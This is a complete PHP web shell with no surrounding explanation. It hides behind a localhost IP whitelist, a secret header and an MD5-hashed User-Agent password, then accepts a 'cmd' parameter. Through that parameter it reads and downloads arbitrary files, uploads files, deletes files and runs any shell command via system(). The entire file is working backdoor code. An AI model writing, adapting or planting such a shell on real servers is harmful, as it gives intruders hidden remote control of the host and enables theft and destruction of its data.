<?php 
  // IP whitelist
  $whitelist = array("127.0.0.1");
  if (!in_array($_SERVER["REMOTE_ADDR"], $whitelist)) {
    die;
  }

  // Header key 
  $key = strtoupper("fn3u2inergi3klqi9fj93in");
  if (!isset($_SERVER["HTTP_".$key])) {
    die;
  }

  // Password
  $hash = "5f4dcc3b5aa765d61d8327deb882cf99";
  if (md5($_SERVER["HTTP_USER_AGENT"]) != $hash) {
    die;
  }

  // Run commands
  $param = "cmd";
  $cmd = $_REQUEST[$param];
  $cmd = trim($cmd);
  
  // File capabilities
  // File download
  if (substr($cmd, 0, 4) === "get ") {
    $c = explode(" ", $cmd);
    $path = $c[1];
    if (!file_exists($path)) {
      echo "$path not found";
      return;
    }

    readfile($path);
    return;
  } 
  // File upload
  if (substr($cmd, 0, 4) === "put ") {
    $c = explode(" ", $cmd);
    $fileName = $c[1];
    $destPath = $c[1];
    if (count($c) > 2) {
      echo count($c);
      echo $c[2];
      $destPath = $c[2];
    }

    if (file_exists($destPath)) {
      echo "$destPath already exists";
      return;
    }

    file_put_contents($destPath, file_get_contents("php://input"));
    echo "Uploaded $fileName to $destPath";
    return;
  }
  // File delete
  if (substr($cmd, 0, 4) == "del ") {
    $c = explode(" ", $cmd);
    $fileName = $c[1];

    if (!unlink($fileName)) {
      echo "$fileName cannot be deleted";
    } else {
      echo "Deleted $fileName";
    }
  }

  // Run system command
  if (isset($_REQUEST[$param])) { 
    system($cmd);
    die;
  }
?>